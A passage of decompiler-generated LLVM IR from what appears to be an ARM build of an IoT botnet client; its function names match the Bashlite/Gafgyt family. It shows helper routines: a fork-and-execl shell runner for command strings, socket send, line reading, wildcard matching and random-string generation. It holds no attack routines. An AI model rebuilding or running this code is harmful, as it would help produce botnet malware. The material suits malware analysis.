  %v2_8d60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d60, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-48, align 4
  %v1_8d70 = call i32 @malloc(i32 2048)
  store i32 %v1_8d70, i32* %stack_var_-40, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8d8c = inttoptr i32 %v1_8d70 to i8*
  %v3_8d8c = call i32 @__GI_memset(i8* %v2_8d8c, i32 0)
  %v2_8d98 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8db8 = call i32 @print(i32* nonnull %stack_var_-40, i32 %arg2, i32 %v2_8d98)
  %v3_8dc0 = call i32 @strlen(i8* %v2_8d8c)
  %v2_8dd0 = add i32 %v3_8dc0, %v1_8d70
  %v3_8dd8 = inttoptr i32 %v2_8dd0 to i8*
  store i8 10, i8* %v3_8dd8, align 1
  %v3_8de0 = call i32 @strlen(i8* %v2_8d8c)
  %v3_8de8 = load i32, i32* %stack_var_-48, align 4
  %v4_8df8 = inttoptr i32 %v1_8d70 to i32*
  %v5_8df8 = call i32 @__libc_send(i32 %v3_8de8, i32* %v4_8df8, i32 %v3_8de0, i32 16384)
  store i32 %v1_8d70, i32* @r0, align 4
  %v0_8e08 = call i32 @free()
  store i32 %v3_8d5c, i32* @fp, align 4
  ret i32 %v5_8df8

; uselistorder directives
  uselistorder i8* %v2_8d8c, { 1, 0, 2 }
  uselistorder i32 %v1_8d70, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e20 = load i32, i32* @fp, align 4
  store i32 36392, i32* %stack_var_-4, align 4
  %v2_8e24 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e24, i32* @fp, align 4
  %v2_8e38 = load i8, i8* %arg2, align 1
  %v7_8e3c = icmp eq i8 %v2_8e38, 114
  br i1 %v7_8e3c, label %dec_label_pc_8e54, label %dec_label_pc_8e44

dec_label_pc_8e44:                                ; preds = %entry
  %v2_8e48 = load i8, i8* %arg2, align 1
  %v7_8e4c = icmp eq i8 %v2_8e48, 119
  br i1 %v7_8e4c, label %dec_label_pc_8e54, label %dec_label_pc_8e68

dec_label_pc_8e54:                                ; preds = %dec_label_pc_8e44, %entry
  %v1_8e58 = add i32 %tmp, 1
  %v1_8e5c = inttoptr i32 %v1_8e58 to i8*
  %v2_8e5c = load i8, i8* %v1_8e5c, align 1
  %v2_8e60 = icmp eq i8 %v2_8e5c, 0
  br i1 %v2_8e60, label %dec_label_pc_8e74, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e44, %dec_label_pc_8e54
  br label %dec_label_pc_9084

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e54
  %v2_8e74 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8e7c = call i32 @__GI_pipe(i32 %v2_8e74)
  %v1_8e84 = icmp slt i32 %v1_8e7c, 0
  br i1 %v1_8e84, label %dec_label_pc_8e8c, label %dec_label_pc_8e98

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e74
  br label %dec_label_pc_9084

dec_label_pc_8e98:                                ; preds = %dec_label_pc_8e74
  %v2_8e9c = load i32, i32* @global_var_28190.37, align 4
  %v2_8ea0 = icmp eq i32 %v2_8e9c, 0
  br i1 %v2_8ea0, label %dec_label_pc_8ea8, label %dec_label_pc_8f2c

dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_28190.37, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp4, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  store i32 ptrtoint ([8 x i8]* @global_var_18fc8.39 to i32), i32* @r0, align 4
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_18fc8.39 to i32), i32 ptrtoint ([3 x i8]* @global_var_18fd0.41 to i32), i32 ptrtoint ([3 x i8]* @global_var_18fd4.43 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp4)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp4, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_28190.37, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_28190.37, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_28190.37, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_28190.37, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_28190.37, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_9228 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_9228, i32* @ip, align 4
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c4 = load i8, i8* %arg1, align 1
  %v2_93506 = icmp eq i8 %v2_934c4, 0
  br i1 %v2_93506, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.07, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_18fd8.46 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.07, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp9, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge4 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp9, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge3 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp9, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.8 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.8, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge4, %dec_label_pc_9438 ], [ %storemerge3, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @r4, align 4
  %v6_95e0 = load i32, i32* @fp, align 4
  %v0_95ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_965817 = icmp sgt i32 %arg2, 0
  br i1 %v5_965817, label %dec_label_pc_9608, label %dec_label_pc_965c

dec_label_pc_9608:                                ; preds = %entry, %dec_label_pc_9608
  %storemerge118 = phi i32 [ %v1_9644, %dec_label_pc_9608 ], [ 0, %entry ]
  %v2_9614 = add i32 %storemerge118, %v0_95ec
  store i32 %v2_9614, i32* @r4, align 4
  %v0_9618 = call i32 @rand_cmwc()
  %v2_9628 = urem i32 %v0_9618, 26
  store i32 %v2_9628, i32* %r0.global-to-local, align 4
  %v1_9634 = add nuw nsw i32 %v2_9628, 65
  %v1_963c = trunc i32 %v1_9634 to i8
  %v2_963c = load i32, i32* @r4, align 4
  %v3_963c = inttoptr i32 %v2_963c to i8*
  store i8 %v1_963c, i8* %v3_963c, align 1
  %v1_9644 = add i32 %storemerge118, 1
  %v3_9650.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9658 = icmp slt i32 %v1_9644, %v3_9650.pre
  br i1 %v5_9658, label %dec_label_pc_9608, label %dec_label_pc_964c.dec_label_pc_965c_crit_edge

dec_label_pc_964c.dec_label_pc_965c_crit_edge:    ; preds = %dec_label_pc_9608
  %v12_9660.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_965c

dec_label_pc_965c:                                ; preds = %dec_label_pc_964c.dec_label_pc_965c_crit_edge, %entry
  %v12_9660 = phi i32 [ %v12_9660.pre, %dec_label_pc_964c.dec_label_pc_965c_crit_edge ], [ %v0_95ec, %entry ]
  store i32 %v3_95e0, i32* @r4, align 4
  store i32 %v6_95e0, i32* @fp, align 4
  ret i32 %v12_9660

; uselistorder directives
  uselistorder i32 %v1_9644, { 1, 0 }
  uselistorder label %dec_label_pc_9608, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_96b8.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
